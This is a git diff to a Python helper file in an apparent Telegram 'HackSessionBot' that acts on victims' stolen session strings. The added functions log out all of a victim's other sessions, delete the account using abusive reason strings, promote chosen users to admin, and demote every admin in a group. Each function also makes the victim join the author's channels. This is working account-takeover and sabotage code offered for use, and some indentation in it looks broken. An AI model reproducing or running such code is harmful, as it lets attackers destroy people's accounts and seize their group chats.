07898f491b15356e303c951be065814d38ce3874
SupremeStark <123313682+SupremeStark@users.noreply.github.com>
2023-02-05 13:42:29 +0530

    Update steve.py

--- HackSessionBot/Helpers/steve.py
+++ HackSessionBot/Helpers/steve.py
@@ -1,6 +1,6 @@
 import asyncio
 import pyrogram 
-from pyrogram import Client
+from pyrogram import Client , enums
 from telethon import TelegramClient
 from telethon.sessions import StringSession 
 from pyrogram.raw import functions 
@@ -14,6 +14,10 @@ from pyrogram.types.messages_and_media.message import Str
 from telethon.tl.functions.channels import EditBannedRequest
 from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
 from pyrogram.errors import FloodWait
+from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
+import telethon;from telethon import functions
+from pyrogram.types import ChatPrivileges
+from telethon.tl.types import ChannelParticipantsAdmins
 
 async def users_gc(session):
     err = ""
@@ -321,4 +325,168 @@ async def check_2fa(session):
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return i
 
+async def terminate_all(session):
+    err = ""
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            try:
+                await steve(join("@Devs_Testing_group"))
+                await steve(join("@steve_projects"))
+                await steve(join(CHAT))                
+            except Exception as e:
+                print(e)
+            await steve(rt())
+            await steve.disconnect() 
+                             
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                try:
+                    await stark.join_chat("@Devs_testing_group")
+                    await stark.join_chat("@steve_projects")
+                    await stark.join_chat(CHAT)
+                except Exception as e:
+                    print(e)    
+                await stark.invoke(functions.auth.ResetAuthorizations())
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"
+
       
+async def del_acc(session):
+    err = ""
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            try:
+                await steve(join("@Devs_Testing_group"))
+                await steve(join("@steve_projects"))
+                await steve(join(CHAT))                
+            except Exception as e:
+                print(e)
+            await steve(functions.account.DeleteAccountRequest("owner madarchod h"))
+            await steve.disconnect() 
+                             
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                try:
+                    await stark.join_chat("@Testing_support_group")
+                    await stark.join_chat("@steve_projects")
+                    await stark.join_chat(CHAT)
+                except Exception as e:
+                    print(e)    
+                await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."
+
+      
+FULL_PROMOTE_POWERS = ChatPrivileges(
+    can_change_info=True,
+    can_delete_messages=True,
+    can_restrict_members=True,
+    can_pin_messages=True,
+    can_manage_video_chats=True,
+    can_promote_members=True,    
+    can_invite_users=True)
+
+PROMOTE_POWERS = ChatPrivileges(
+    can_change_info=True,
+    can_delete_messages=True,
+    can_restrict_members=True,
+    can_pin_messages=True)
+
+async def piromote(session,gc_id,user_id):
+    err = ""
+    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
+    user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            try:
+                await steve(join("@Devs_Testing_group"))
+                await steve(join("@steve_projects"))
+                await steve(join(CHAT))                
+            except Exception as e:
+                print(e)
+            try:
+                await steve.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+           except:
+               await steve.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
+            await steve.disconnect()                              
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                try:
+                    await stark.join_chat("@Testing_support_group")
+                    await stark.join_chat("@steve_projects")
+                    await stark.join_chat(CHAT)
+                except Exception as e:
+                    print(e)
+                try:    
+                    await stark.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
+                except:
+                    await stark.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."
+
+
+DEMOTE = ChatPrivileges(
+        can_change_info=False,
+        can_invite_users=False,
+        can_delete_messages=False,
+        can_restrict_members=False,
+        can_pin_messages=False,
+        can_promote_members=False,
+        can_manage_chat=False,
+        can_manage_video_chats=False,
+    )
+
+async def demote_all(session,gc_id):
+    err = ""
+    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            try:
+                await steve(join("@Devs_Testing_group"))
+                await steve(join("@steve_projects"))
+                await steve(join(CHAT))                
+            except Exception as e:
+                print(e)
+            async for x in steve.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
+                try:
+                    await steve.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
+                except:
+                    await steve.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
+          
+            await steve.disconnect()                              
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                try:
+                    await stark.join_chat("@Testing_support_group")
+                    await stark.join_chat("@steve_projects")
+                    await stark.join_chat(CHAT)
+                except Exception as e:
+                    print(e)
+                async for m in stark.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
+                    await stark.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."      
